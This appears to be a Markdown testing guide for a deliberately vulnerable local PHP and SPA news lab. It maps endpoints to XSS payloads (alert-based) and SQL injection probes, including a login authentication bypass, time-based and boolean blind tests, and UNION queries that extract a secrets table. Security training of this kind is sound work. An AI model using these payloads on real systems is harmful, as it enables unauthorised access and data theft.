# NewsHub XSS & SQLi Testing Guide

Tai lieu nay liet ke cac endpoint va route can kiem thu XSS/SQLi trong NewsHub Vulnerable Lab.

Chi dung trong moi truong lab local:

```text
http://127.0.0.1:8080
```

Khong public lab nay ra Internet hoac mang khong tin cay.

## Quick Access

Classic PHP app:

```text
/
/index.php
/search.php
/news.php?id=1
/category.php?id=1
/user/login.php
/user/register.php
/user/profile.php
/admin/dashboard.php
/admin/users.php
/admin/news_manage.php
```

SPA app:

```text
/spa/search
/spa/article/1
/spa/comments/1
/spa/logs
```

SPA JSON API:

```text
/api/spa/search.php?q=...
/api/spa/news.php?id=...
/api/spa/comments.php?news_id=...
/api/spa/comment_add.php
/api/spa/logs.php?keyword=...
```

Classic API:

```text
/api/suggest.php?q=...
/api/track.php?page=...&id=...&ref=...
```

Tai khoan mau:

```text
admin / admin123
editor1 / editor123
thinhnv / password123
minhlt / password
huongnt / 12345678
```

## XSS Overview

Payload an toan de test alert:

```html
<img src=x onerror=alert(1)>
```

Payload script tag:

```html
<script>alert(1)</script>
```

Payload HTML break-out cho context nam trong attribute:

```html
"><img src=x onerror=alert(1)>
```

Nen URL-encode payload khi gan vao query string:

```text
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

## Reflected XSS

### 1. Search page keyword

Endpoint:

```text
GET /search.php?q=PAYLOAD
```

Source:

```text
q
```

Sink:

```text
HTML response trong search page
input value raw
message "Ket qua tim kiem cho" raw
no-result message raw
```

Test:

```text
/search.php?q=<img src=x onerror=alert(1)>
/search.php?q="><img src=x onerror=alert(1)>
```

Ghi chu:

```text
q cung duoc luu vao search_logs, nen cung co the tro thanh stored XSS o admin dashboard va SPA logs.
```

### 2. Search page author

Endpoint:

```text
GET /search.php?author=PAYLOAD
```

Source:

```text
author
```

Sink:

```text
message "Ket qua tim kiem cho" raw
```

Test:

```text
/search.php?author=<img src=x onerror=alert(1)>
```

Ghi chu:

```text
author cung nam trong SQL raw, nen co the tao SQL error neu payload co dau quote.
```

### 3. SPA search query

Route:

```text
GET /spa/search?q=PAYLOAD
```

API:

```text
GET /api/spa/search.php?q=PAYLOAD
```

Source:

```text
q
```

Sink:

```text
SPA render data.query bang innerHTML
```

Test:

```text
/spa/search?q=<img src=x onerror=alert(1)>
```

Ghi chu:

```text
Day la reflected XSS trong SPA vi JSON tu API duoc client render unsafe.
```

## Stored XSS

### 1. Comment stored XSS - classic page

Create endpoint:

```text
POST /comment/add.php
```

Body:

```text
news_id=1
author_name=guest
content=<img src=x onerror=alert(1)>
```

Sink:

```text
GET /news.php?id=1
```

Vulnerable field:

```text
comments.content
```

Ghi chu:

```text
news.php render comment content raw.
```

### 2. Comment stored XSS - SPA

Create route:

```text
GET /spa/comments/1
```

Create API:

```text
POST /api/spa/comment_add.php
```

Body:

```text
news_id=1
author_name=spa_guest
content=<img src=x onerror=alert(1)>
```

Sink:

```text
GET /spa/comments/1
GET /api/spa/comments.php?news_id=1
```

Vulnerable fields:

```text
comments.content
comments.author_name
```

Ghi chu:

```text
SPA lay JSON comment va render comment.content bang innerHTML.
```

### 3. User bio stored XSS

Create endpoint:

```text
POST /user/register.php
```

Body:

```text
username=xsstest
email=xsstest@example.local
password=password123
bio=<img src=x onerror=alert(1)>
```

Update endpoint:

```text
POST /user/profile.php
```

Body:

```text
action=update
email=xsstest@example.local
bio=<img src=x onerror=alert(1)>
```

Sink:

```text
GET /user/profile.php?user=xsstest
GET /admin/users.php
```

Vulnerable field:

```text
users.bio
```

Ghi chu:

```text
profile.php va admin/users.php render bio raw.
```

### 4. Search keyword stored XSS

Seed endpoint:

```text
GET /search.php?q=PAYLOAD
GET /api/spa/search.php?q=PAYLOAD
```

Payload:

```text
<img src=x onerror=alert(1)>
```

Sink:

```text
GET /admin/dashboard.php
GET /spa/logs
GET /api/spa/logs.php
```

Vulnerable field:

```text
search_logs.keyword
```

Ghi chu:

```text
admin/dashboard.php render keyword raw.
SPA logs render keyword raw bang innerHTML.
```

### 5. User-Agent stored XSS in SPA logs

Seed endpoint:

```text
GET /search.php?q=test
GET /api/spa/search.php?q=test
```

Header:

```text
User-Agent: <img src=x onerror=alert(1)>
```

Sink:

```text
GET /spa/logs
GET /api/spa/logs.php
```

Vulnerable field:

```text
search_logs.user_agent
```

Ghi chu:

```text
Can dung Burp/ZAP/curl de sua User-Agent. Classic admin dashboard khong hien user_agent, SPA logs co hien.
```

### 6. Admin news fields stored XSS in SPA

Create/update endpoint:

```text
POST /admin/news_manage.php
```

Body fields:

```text
title=...
summary=...
content=...
category_id=1
tags=...
status=published
```

Possible sinks:

```text
GET /spa/article/{id}
GET /spa/search?q=...
GET /api/spa/news.php?id={id}
GET /api/spa/search.php?q=...
```

Vulnerable fields:

```text
news.title
news.summary
news.content
news.tags
```

Ghi chu:

```text
SPA render nhieu field va JSON debug output bang innerHTML. Classic news.php render content nhu HTML.
Can dang nhap de vao admin/news_manage.php.
```

## DOM-Based XSS

### 1. Classic search suggestions

Page:

```text
GET /search.php?q=PAYLOAD
```

API source:

```text
GET /api/suggest.php?q=...
```

Sink:

```text
search.php JavaScript tao HTML string va gan vao suggestions-container.innerHTML
```

Flow:

```text
1. /search.php?q=PAYLOAD luu keyword raw vao search_logs.
2. JS goi /api/suggest.php?q=PAYLOAD.
3. API tra suggestion raw tu search_logs/tags.
4. JS render suggestion bang innerHTML.
```

Test:

```text
/search.php?q=<img src=x onerror=alert(1)>
```

### 2. SPA search render

Route:

```text
GET /spa/search?q=PAYLOAD
```

API:

```text
GET /api/spa/search.php?q=PAYLOAD
```

Sink:

```text
app.js render data.query va result fields bang innerHTML
```

Test:

```text
/spa/search?q=<img src=x onerror=alert(1)>
```

### 3. SPA comments render

Route:

```text
GET /spa/comments/1
```

API:

```text
GET /api/spa/comments.php?news_id=1
```

Sink:

```text
app.js render comments.content va comments.author_name bang innerHTML
```

Test:

```text
Tao comment co content = <img src=x onerror=alert(1)>
Mo lai /spa/comments/1
```

### 4. SPA logs render

Route:

```text
GET /spa/logs
GET /spa/logs?keyword=...
```

API:

```text
GET /api/spa/logs.php?keyword=...
```

Sink:

```text
app.js render keyword va user_agent bang innerHTML
```

Test:

```text
/api/spa/search.php?q=<img src=x onerror=alert(1)>
/spa/logs
```

### 5. SPA article render

Route:

```text
GET /spa/article/1
```

API:

```text
GET /api/spa/news.php?id=1
```

Sink:

```text
app.js render article.title, article.content, article.cat_name, article.username bang innerHTML
```

Possible source:

```text
news table fields
SQLi UNION response from /api/spa/news.php?id=...
```

## SQLi Overview

Common probes:

```text
'
" 
' OR 1=1--%20
' AND 1=2--%20
1 OR 1=1
1 AND 1=2
1 AND SLEEP(5)
```

Error-based probe:

```text
' AND extractvalue(1,concat(0x7e,database()))--%20
```

Boolean blind pair:

```text
AND 1=1
AND 1=2
```

Time-based probe:

```text
AND SLEEP(5)
AND IF(1=1,SLEEP(5),0)
```

Secret table target:

```text
secret_configs(config_key, config_value, description)
```

## SQLi - Classic Server-Rendered Pages

### 1. Search SQLi error-based

Endpoint:

```text
GET /search.php?q=...
GET /search.php?author=...
```

Vulnerable params:

```text
q
author
```

Behavior:

```text
SQL error is printed in HTML response.
```

Tests:

```text
/search.php?q='
/search.php?q=' OR 1=1--%20
/search.php?q=' AND extractvalue(1,concat(0x7e,database()))--%20
/search.php?author=admin' OR '1'='1'--%20
```

### 2. Login SQLi auth bypass

Endpoint:

```text
POST /user/login.php
```

Vulnerable fields:

```text
username
password
```

Tests:

```text
username=admin'--%20
password=anything
```

```text
username=' OR '1'='1'--%20
password=anything
```

Behavior:

```text
Bypass password check and create session.
```

### 3. News article SQLi UNION/error-based

Endpoint:

```text
GET /news.php?id=...
```

Vulnerable param:

```text
id
```

Tests:

```text
/news.php?id='
/news.php?id=1 OR 1=1
/news.php?id=1 AND SLEEP(5)
```

UNION idea:

```text
/news.php?id=-1 UNION SELECT 1,config_key,config_value,'summary',1,1,0,'published','tag',NOW(),NOW(),'user','email','cat' FROM secret_configs--%20
```

Behavior:

```text
Error is printed with SQL query.
UNION output can appear in article title/content/metadata fields.
```

### 4. Category SQLi boolean-based blind

Endpoint:

```text
GET /category.php?id=...
```

Vulnerable param:

```text
id
```

Tests:

```text
/category.php?id=1 AND 1=1
/category.php?id=1 AND 1=2
/category.php?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='0'
/category.php?id=1 AND SLEEP(5)
```

Behavior:

```text
True condition returns normal category/articles.
False condition returns empty/not found.
Errors are not the main signal.
```

### 5. Profile SQLi time-based

Endpoint:

```text
GET /user/profile.php?user=...
```

Vulnerable param:

```text
user
```

Tests:

```text
/user/profile.php?user=admin' AND SLEEP(5)--%20
/user/profile.php?user=admin' AND IF(1=1,SLEEP(5),0)--%20
```

Behavior:

```text
SQL errors are intentionally quiet. Use timing or page behavior.
```

### 6. Profile update SQLi/stored XSS

Endpoint:

```text
POST /user/profile.php
```

Vulnerable fields:

```text
bio
email
```

Body:

```text
action=update
email=test@example.local
bio=PAYLOAD
```

Behavior:

```text
bio is inserted raw into UPDATE statement and rendered raw later.
Requires logged-in user and own profile.
```

### 7. Register second-order SQLi / stored XSS

Endpoint:

```text
POST /user/register.php
```

Vulnerable field:

```text
bio
```

Body:

```text
username=testuser
email=test@example.local
password=password123
bio=PAYLOAD
```

Behavior:

```text
bio is stored raw and later used/rendered in profile/admin views.
```

### 8. Comment add SQLi / stored XSS

Endpoint:

```text
POST /comment/add.php
```

Vulnerable fields:

```text
news_id
author_name
content
```

Body:

```text
news_id=1
author_name=guest
content=PAYLOAD
```

Behavior:

```text
content is inserted raw and rendered raw in comments.
```

### 9. Tracking API SQLi time-based blind

Endpoint:

```text
GET /api/track.php?page=...&id=...&ref=...
```

Vulnerable params:

```text
id
ref
```

Tests:

```text
/api/track.php?page=news&id=1' AND SLEEP(5)--%20
/api/track.php?page=news&id=1&ref=http://x.local' AND IF(1=1,SLEEP(5),0)--%20
```

Behavior:

```text
Returns 1x1 GIF and suppresses DB errors. Use response time.
```

### 10. Suggest API SQLi

Endpoint:

```text
GET /api/suggest.php?q=...
```

Vulnerable param:

```text
q
```

Tests:

```text
/api/suggest.php?q=' OR 1=1--%20
/api/suggest.php?q=' AND SLEEP(5)--%20
```

Behavior:

```text
Errors are mostly hidden because endpoint returns JSON suggestions.
Useful with blind/time-based probes.
Also serves as JSON source for DOM XSS in /search.php.
```

## SQLi - Admin Pages

Admin pages require a logged-in session, but some pages only check login, not strong admin authorization.

### 1. Admin dashboard UNION SQLi

Endpoint:

```text
GET /admin/dashboard.php?filter_cat=...
```

Vulnerable param:

```text
filter_cat
```

Other params:

```text
filter_status is escaped
filter_date is currently unused
```

Tests:

```text
/admin/dashboard.php?filter_cat=1'
/admin/dashboard.php?filter_cat=1 OR 1=1
```

UNION idea:

```text
/admin/dashboard.php?filter_cat=-1 UNION SELECT 1,config_key,'published',0,NOW(),'user',config_value FROM secret_configs--%20
```

Behavior:

```text
SQL error is shown in dashboard.
UNION output appears in news management table.
```

### 2. Admin users boolean-based SQLi

Endpoint:

```text
GET /admin/users.php?search_user=...
```

Vulnerable param:

```text
search_user
```

Other params:

```text
role is escaped
```

Tests:

```text
/admin/users.php?search_user=admin' AND 1=1--%20
/admin/users.php?search_user=admin' AND 1=2--%20
/admin/users.php?search_user=admin' AND (SELECT COUNT(*) FROM secret_configs)>0--%20
```

Behavior:

```text
Errors are suppressed. Use result count/table difference.
```

### 3. Admin news edit SQLi

Endpoint:

```text
GET /admin/news_manage.php?edit_id=...
```

Vulnerable param:

```text
edit_id
```

Tests:

```text
/admin/news_manage.php?edit_id=1'
/admin/news_manage.php?edit_id=1 OR 1=1
```

Behavior:

```text
edit_id is used raw in SELECT * FROM news WHERE id = ...
```

### 4. Admin news POST SQLi / stored XSS

Endpoint:

```text
POST /admin/news_manage.php
```

Vulnerable fields:

```text
tags
post_id related update path
```

Body fields:

```text
post_id=0
title=...
summary=...
content=...
category_id=1
tags=PAYLOAD
status=published
```

Behavior:

```text
tags is stored raw in INSERT/UPDATE.
```

## SQLi - SPA JSON API

These endpoints return JSON and are called by the SPA. Test them directly with browser, curl, Burp, ZAP, Postman, or DevTools Network.

### 1. SPA search API

Endpoint:

```text
GET /api/spa/search.php?q=...&sort=...
```

Vulnerable param:

```text
q
```

Other params:

```text
sort allows newest/views only
```

Tests:

```text
/api/spa/search.php?q='
/api/spa/search.php?q=' OR 1=1--%20
/api/spa/search.php?q=' AND extractvalue(1,concat(0x7e,database()))--%20
```

Behavior:

```text
Errors are returned as JSON: ok=false, db_error, sql.
q is also inserted into search_logs raw.
```

SPA sink:

```text
/spa/search?q=PAYLOAD
```

### 2. SPA article API

Endpoint:

```text
GET /api/spa/news.php?id=...
```

Vulnerable param:

```text
id
```

Tests:

```text
/api/spa/news.php?id='
/api/spa/news.php?id=1 OR 1=1
/api/spa/news.php?id=1 AND SLEEP(5)
```

UNION idea:

```text
/api/spa/news.php?id=-1 UNION SELECT 1,config_key,config_value,'summary','tag',0,NOW(),'user','email','cat',1 FROM secret_configs--%20
```

Behavior:

```text
Errors are returned as JSON.
SPA renders article fields with innerHTML.
```

SPA sink:

```text
/spa/article/1
```

### 3. SPA comments API

Endpoint:

```text
GET /api/spa/comments.php?news_id=...
```

Vulnerable param:

```text
news_id
```

Tests:

```text
/api/spa/comments.php?news_id=1 OR 1=1
/api/spa/comments.php?news_id=1 AND SLEEP(5)
```

Behavior:

```text
Errors are returned as JSON.
SPA renders comments with innerHTML.
```

SPA sink:

```text
/spa/comments/1
```

### 4. SPA comment create API

Endpoint:

```text
POST /api/spa/comment_add.php
```

Vulnerable fields:

```text
news_id
author_name
content
```

Body:

```text
news_id=1
author_name=spa_guest
content=<img src=x onerror=alert(1)>
```

Behavior:

```text
Creates stored XSS.
Raw fields are interpolated into INSERT SQL.
Errors are returned as JSON.
```

Sink:

```text
/spa/comments/1
/news.php?id=1
```

### 5. SPA logs API

Endpoint:

```text
GET /api/spa/logs.php?keyword=...
```

Vulnerable param:

```text
keyword
```

Tests:

```text
/api/spa/logs.php?keyword='
/api/spa/logs.php?keyword=' OR 1=1--%20
/api/spa/logs.php?keyword=' AND SLEEP(5)--%20
```

Behavior:

```text
Errors are returned as JSON.
SPA renders keyword and user_agent with innerHTML.
```

SPA sink:

```text
/spa/logs
/spa/logs?keyword=...
```

## Static Pages

Static HTML pages:

```text
/static/about.html
/static/contact.html
/static/faq.html
```

Current status:

```text
No database query.
No backend form processing.
Useful for crawler/static content tests, not primary XSS/SQLi targets.
```

## Recommended Testing Flow

1. Start app:

```bash
docker compose up -d --build
# or
docker-compose up -d --build
```

2. Browse classic app:

```text
http://127.0.0.1:8080/search.php?q=test
http://127.0.0.1:8080/news.php?id=1
```

3. Browse SPA app:

```text
http://127.0.0.1:8080/spa/search
http://127.0.0.1:8080/spa/comments/1
http://127.0.0.1:8080/spa/logs
```

4. Use DevTools Network/Burp/ZAP to capture these API calls:

```text
/api/spa/search.php
/api/spa/news.php
/api/spa/comments.php
/api/spa/comment_add.php
/api/spa/logs.php
/api/suggest.php
/api/track.php
```

5. Test XSS first with harmless `alert(1)` payloads.

6. Test SQLi with simple quote/error probes, then boolean/time-based probes, then UNION only inside lab.

## Endpoint Matrix

| Type | Method | Endpoint/Route | Param/Field | Sink/Signal |
|---|---:|---|---|---|
| Reflected XSS | GET | `/search.php` | `q`, `author` | HTML response |
| DOM XSS | GET | `/search.php` | `q` via `/api/suggest.php` | `innerHTML` suggestions |
| Stored XSS | POST | `/comment/add.php` | `content` | `/news.php?id=...` |
| Stored XSS | POST | `/user/register.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
| Stored XSS | POST | `/user/profile.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
| Stored XSS | GET | `/search.php` | `q` | `/admin/dashboard.php`, `/spa/logs` |
| DOM/Stored XSS | GET | `/spa/search` | `q` | SPA `innerHTML` |
| DOM/Stored XSS | GET | `/spa/comments/{id}` | comment JSON | SPA `innerHTML` |
| DOM/Stored XSS | GET | `/spa/logs` | log JSON | SPA `innerHTML` |
| SQLi Error | GET | `/search.php` | `q`, `author` | DB error in HTML |
| SQLi Auth Bypass | POST | `/user/login.php` | `username`, `password` | Login session |
| SQLi UNION/Error | GET | `/news.php` | `id` | Article output/error |
| SQLi Boolean | GET | `/category.php` | `id` | Result/no-result |
| SQLi Time | GET | `/user/profile.php` | `user` | Response delay |
| SQLi Time | GET | `/api/track.php` | `id`, `ref` | Response delay |
| SQLi Blind | GET | `/api/suggest.php` | `q` | JSON/timing |
| SQLi UNION/Error | GET | `/admin/dashboard.php` | `filter_cat` | Table/error |
| SQLi Boolean | GET | `/admin/users.php` | `search_user` | Result count |
| SQLi | GET | `/admin/news_manage.php` | `edit_id` | Form/error |
| SQLi JSON | GET | `/api/spa/search.php` | `q` | JSON `db_error` |
| SQLi JSON | GET | `/api/spa/news.php` | `id` | JSON `db_error` |
| SQLi JSON | GET | `/api/spa/comments.php` | `news_id` | JSON `db_error` |
| SQLi JSON | POST | `/api/spa/comment_add.php` | `news_id`, `author_name`, `content` | JSON `db_error` |
| SQLi JSON | GET | `/api/spa/logs.php` | `keyword` | JSON `db_error` |

